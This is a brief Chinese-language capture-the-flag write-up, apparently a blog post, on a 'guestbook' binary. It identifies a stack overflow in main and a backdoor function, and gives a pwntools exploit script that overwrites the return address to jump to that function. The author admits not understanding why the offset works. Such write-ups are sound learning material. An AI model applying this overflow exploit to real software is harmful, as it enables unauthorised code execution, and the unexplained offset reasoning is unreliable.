检测安全机制

![image-20201201212323957](https://static.hack1s.fun/images/2021/02/06/image-20201201212323957.png)

存在后门函数

![image-20201201212554219](https://static.hack1s.fun/images/2021/02/06/image-20201201212554219.png)

main函数里存在溢出

![image-20201201212627272](https://static.hack1s.fun/images/2021/02/06/image-20201201212627272.png)

read读了0x100，但是距离rbp只有0x88

直接返回到good_game

这里感觉很奇怪，长度0x88可以返回，但是不知道为什么不+8这个rbp的长度

```python
from pwn import *

io = process('./guestbook')
elf = ELF('./guestbook')

payload = bytes('a'*0x88,'ascii') + p64(elf.sym['good_game'])
io.sendline(payload)

io.interactive()
```

